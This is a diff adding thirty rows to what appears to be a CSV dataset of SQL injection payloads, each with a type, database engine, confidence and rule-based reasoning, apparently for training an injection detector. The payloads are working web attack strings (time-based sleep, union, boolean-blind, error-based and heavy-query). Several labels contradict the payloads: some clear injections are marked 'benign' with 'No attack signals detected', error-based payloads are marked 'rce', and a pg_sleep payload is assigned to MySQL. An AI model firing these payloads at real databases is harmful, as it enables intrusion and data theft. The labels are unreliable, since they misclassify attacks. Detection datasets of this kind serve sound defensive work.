@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+6180,1'|| ( select 'yydv' from dual where 9639 = 9639,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6181,1' where 5455 = 5455 and sleep ( 5 ) --,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+6182,1 ) where 5944 = 5944 and ( 4446 = 8843 ) *8843--,1,,boolean_blind,generic,0.95,5944 = 5944 and detected — boolean_blind injection (priority 8) on generic,rule-based
+6183,"-2007%' ) ) union all select 7298,7298,7298#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6184,"1' where 4880 = 4880 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+6185,1'+ ( select ankx where 6789 = 6789,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6186,select ( case when ( 9388 = 4322 ) then 1 else 9388* ( select 9388 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6187,"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+6188,"select sleep ( 5 ) and ""jvys"" like ""jvys",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6189,"-6086"" union all select 8700,8700,8700,8700--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6190,"-1366' or make_set ( 9354 = 9354,7185 ) and 'abre' = 'abre",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6191,"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+6192,"1 where 2292 = 2292 union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6193,select ( case when ( 2768 = 8868 ) then 2768 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6194,"1 and elt ( 8853 = 1675,1675 ) -- jegm",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6195,1' ) ) as stnn where 6160 = 6160 and 8881 = 7347--,1,,boolean_blind,generic,0.95,6160 = 6160 and detected — boolean_blind injection (priority 8) on generic,rule-based
+6196,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
+6197,1' where 9381 = 9381,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6198,1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+6199,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6200,1 ) as uhmm where 2304 = 2304 union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6201,"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6202,"1%"" ) ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6203,"1"" ) as jrse where 9185 = 9185 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
+6204,"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6205,"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+6206,1'|| ( select 'tzxr' from dual where 2934 = 2934 and 4595 = 4595#,1,,boolean_blind,oracle,0.95,2934 = 2934 and detected — boolean_blind injection (priority 8) on oracle,rule-based
+6207,"1"" ) where 4849 = 4849 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
+6208,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6209,"-3649"" ) ) as eydu where 3220 = 3220 or elt ( 8705 = 1510,1510 ) --",1,,boolean_blind,generic,0.95,3220 = 3220 or detected — boolean_blind injection (priority 8) on generic,rule-based
